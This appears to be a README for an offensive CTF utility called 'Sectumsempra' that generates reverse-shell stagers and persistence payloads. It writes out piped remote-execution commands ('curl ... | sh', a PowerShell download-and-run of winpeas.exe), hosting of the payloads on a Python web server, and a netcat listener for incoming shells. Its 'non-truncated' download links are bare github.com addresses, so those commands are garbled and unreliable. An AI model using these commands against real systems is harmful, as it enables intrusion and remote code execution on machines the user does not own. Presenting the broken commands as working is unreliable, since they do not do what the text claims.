# Sectumsempra Automated Stager and Script Generation Utility

## System Overview
Sectumsempra is an automated deployment framework designed to generate cross platform stagers, automated execution vectors, and persistence primitives for CTF environments. It evaluates local interfaces, resolves routing conflicts between active VPN structures and local area network interfaces, and outputs raw operational code blocks.

## System Features and Link Integrity
The utility integrates raw, non-truncated upstream stager download pipelines for system assessment tools:
* Linux Execution Vector: curl -sL https://github.com | sh
* Windows Execution Vector: iwr https://github.com -OutFile winpeas.exe; .\winpeas.exe

## Multi Tab Operational Workflow

### Terminal Tab 2 Payload Generation and Hosting
Execute the script to dynamically bind to your active IP structure and define the target reverse listener port.

```bash
python3 sectumsempra.py LPORT
```

Following generation, deploy a local web infrastructure server to host the generated payloads:

```bash
python3 -m http.server 8080
```

### Terminal Tab 3 Local Network Listener Execution
Prior to launching stagers on the target environment, initialize the listener architecture within the third terminal tab to intercept the oncoming connection payload:

```bash
rlwrap nc -lvnp LPORT
```

## System Output Log Format
* Utilizing Local Network Binding Address HOST_IP
* Utilizing Specified Listening Port LPORT
* Linux Deployment Script Ready
* Windows PowerShell Automation Script Ready
* Sectumsempra Payload Generation Complete
